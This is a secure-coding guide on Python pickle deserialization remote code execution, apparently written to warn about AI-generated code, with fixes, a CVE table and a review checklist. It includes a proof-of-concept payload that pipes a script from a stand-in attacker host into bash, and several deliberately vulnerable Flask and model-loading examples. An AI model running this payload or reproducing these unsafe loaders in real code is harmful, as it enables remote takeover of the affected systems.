# Pickle Deserialization RCE

> **Severity:** Critical
> **CVSS:** 9.8 (Critical)
> **AI Generation Risk:** Very High — ML/AI codebases commonly use pickle for model serialization

---

## Vulnerability Explanation

Python's `pickle` module is a binary serialization format that can execute arbitrary Python code during deserialization. Unlike JSON or other data-only formats, pickle can serialize and deserialize *any* Python object, including classes, functions, and callables. During unpickling, pickle reconstructs objects by calling `__reduce__()` or `__reduce_ex__()` methods, which can execute arbitrary code.

**The fundamental problem:** `pickle.load()` is equivalent to `eval()` for serialized data. The attacker controls what objects get instantiated and what code runs during reconstruction.

### How Pickle RCE Works

When you call `pickle.loads(data)`, the pickle protocol:

1. Reads opcodes from the byte stream
2. Reconstructs objects by calling class constructors
3. Executes `__setstate__()`, `__reduce__()`, and other magic methods
4. **Can execute arbitrary code** through crafted opcodes like `REDUCE`, `BUILD`, or `INST`

An attacker can craft a pickle payload that executes `os.system()`, `subprocess.Popen()`, or any Python callable during deserialization:

```python
import pickle
import os

# Malicious class that executes code during unpickling
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

# Serialize the exploit
malicious_payload = pickle.dumps(Exploit())

# When victim calls pickle.loads(malicious_payload), RCE occurs
pickle.loads(malicious_payload)  # 💥 Code executes here
```

---

## How AI / Vibe Coding Generates This

AI code generators produce pickle-vulnerable code constantly, especially in these scenarios:

### 1. ML Model Serialization (Most Common)

AI assistants default to pickle for saving models because it's the path of least resistance:

```python
# 🚫 VULNERABLE — AI-generated ML code
import pickle
import joblib

# User uploads a "model file" — loaded directly
def load_model(filepath):
    with open(filepath, 'rb') as f:
        model = pickle.load(f)  # 💥 RCE if file is malicious
    return model
```

### 2. Session Data / Caching

AI models reach for pickle to serialize session data or cache objects:

```python
# 🚫 VULNERABLE — AI-generated session handling
import pickle
import base64

def decode_session(session_data):
    decoded = base64.b64decode(session_data)
    return pickle.loads(decoded)  # 💥 Attacker-controlled session = RCE
```

### 3. Data Pipeline Serialization

```python
# 🚫 VULNERABLE — AI-generated data pipeline
def load_intermediate_data(path):
    import pickle
    return pickle.load(open(path, 'rb'))  # 💥
```

### Why AI Does This

- **Training data prevalence:** Pickle appears in thousands of tutorials, ML notebooks, and Stack Overflow answers
- **Path of least resistance:** `pickle.dump()` / `pickle.load()` is 1-2 lines vs. 5+ for safe alternatives
- **ML/AI bias:** AI models disproportionately generate ML code where pickle is the ecosystem default
- **No security context:** AI doesn't "know" the data source is untrusted

---

## Vulnerable Code Example

### Web App Accepting Pickled Data

```python
# 🚫 VULNERABLE — AI-generated Flask endpoint
from flask import Flask, request
import pickle
import base64

app = Flask(__name__)

@app.route('/load_state', methods=['POST'])
def load_state():
    data = request.json.get('state')
    decoded = base64.b64decode(data)
    state = pickle.loads(decoded)  # 💥 RCE
    return {'status': 'loaded', 'state': str(state)}
```

### ML Model Loading (Real-World Pattern)

```python
# 🚫 VULNERABLE — Model loading in production
import pickle
from flask import Flask, request

app = Flask(__name__)

@app.route('/predict', methods=['POST'])
def predict():
    model_file = request.files['model']
    model = pickle.load(model_file)  # 💥 RCE via uploaded model
    return {'result': model.predict(request.json['features'])}
```

---

## Secure Code Fix

### Fix 1: Use Safe Serialization Formats

```python
# ✅ SAFE — Use JSON or safe alternatives
import json
from flask import Flask, request

app = Flask(__name__)

@app.route('/load_state', methods=['POST'])
def load_state():
    data = request.json.get('state')
    # JSON is safe — no code execution possible
    state = json.loads(data)
    return {'status': 'loaded', 'state': str(state)}
```

### Fix 2: Use safetensors for ML Models

```python
# ✅ SAFE — Use safetensors for ML model weights
from safetensors import safe_open
from flask import Flask, request

def load_model_weights(filepath):
    """Load model weights safely — no code execution possible."""
    tensors = {}
    with safe_open(filepath, framework="pt") as f:
        for key in f.keys():
            tensors[key] = f.get_tensor(key)
    return tensors
```

### Fix 3: Use `pickle` with Integrity Verification (Defense in Depth)

```python
# ✅ IMPROVED — HMAC verification prevents tampering
import pickle
import hmac
import hashlib

SECRET_KEY = b'super-secret-key'  # From environment variable

def safe_pickle_load(data):
    """Load pickled data only if HMAC signature is valid."""
    # Expect format: signature(32 bytes) || pickled_data
    signature = data[:32]
    payload = data[32:]
    
    expected = hmac.new(SECRET_KEY, payload, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Data integrity check failed")
    
    return pickle.loads(payload)  # Still risky with untrusted origin
```

### Fix 4: Restrict Available Classes

```python
# ✅ RESTRICTED — Allowlist-based unpickler
import pickle
import io

class SafeUnpickler(pickle.Unpickler):
    """Only allow safe built-in types."""
    ALLOWED = {
        'builtins.list', 'builtins.dict', 'builtins.int',
        'builtins.str', 'builtins.float', 'builtins.bytes',
        'builtins.tuple', 'builtins.set', 'builtins.bool',
        'builtins.NoneType',
    }
    
    def find_class(self, module, name):
        if f'{module}.{name}' not in self.ALLOWED:
            raise pickle.UnpicklingError(f'Class {module}.{name} is not allowed')
        return super().find_class(module, name)

def safe_load(data):
    return SafeUnpickler(io.BytesIO(data)).load()
```

---

## Real-World CVEs

| CVE | CVSS | Description | Impact |
|---|---|---|---|
| **CVE-2025-1716** | 9.8 | Picklescan (< 0.0.22) does not treat `pip` as an unsafe global, so a malicious pickle can call `pip.main()` and slip past the scanner | Bypasses safety scanners in ML pipelines |
| **CVE-2025-3108** | 7.5 | llama_index `JsonPickleSerializer` falls back to `pickle.loads()` on untrusted data | AI/RAG framework — deserialization RCE |
| **CVE-2025-32434** | 9.8 | PyTorch `torch.load` RCE **even with `weights_only=True`** (fixed 2.6.0) | Loading a model file → RCE |
| **CVE-2024-37052** | 8.8 | MLflow (≥ 1.1.0) — a maliciously uploaded scikit-learn model runs arbitrary code when interacted with | ML model registry — RCE |
| **CVE-2024-3568** | 9.6 | HuggingFace Transformers (< 4.38.0) `TFPreTrainedModel.load_repo_checkpoint()` calls `pickle.load()` on untrusted checkpoints | Malicious checkpoint → RCE |
| **CVE-2024-50050** | 6.3 | Meta Llama Stack used pickle as the serialization format for socket communication | AI agent framework — RCE |

---

## Prevention Checklist

- [ ] Never call `pickle.load()` or `pickle.loads()` on data from untrusted sources
- [ ] Never accept serialized model files from users (allow model weight formats only)
- [ ] Use `safetensors` (ML), `json`, `msgpack`, or `protobuf` instead of pickle
- [ ] If pickle is unavoidable, sign payloads with HMAC and verify before loading
- [ ] Restrict unpickler classes to a safe allowlist
- [ ] Run pickle deserialization in a sandboxed environment (container, seccomp)
- [ ] Scan ML model files with tools like Picklescan *before* loading
- [ ] Prefer `torch.jit.save()` over `torch.save()` (more restricted)
- [ ] Audit AI-generated code for `pickle.load` / `pickle.loads` usage
- [ ] Use `dill` alternatives with the same caution — they're equally dangerous

---

## Vibe Coding Red Flags

When reviewing AI-generated Python, flag these immediately:

```python
pickle.load(...)              # Always suspicious
pickle.loads(...)             # Always suspicious
joblib.load(...)              # Uses pickle underneath
torch.load(..., pickle_module=pickle)  # If weights_only=False
dill.load(...)                # More dangerous than pickle
cloudpickle.load(...)         # Even more powerful, equally dangerous
```

> **Remember:** If you see `pickle.load()` in AI-generated code, assume it's a security vulnerability until proven otherwise by a threat model.
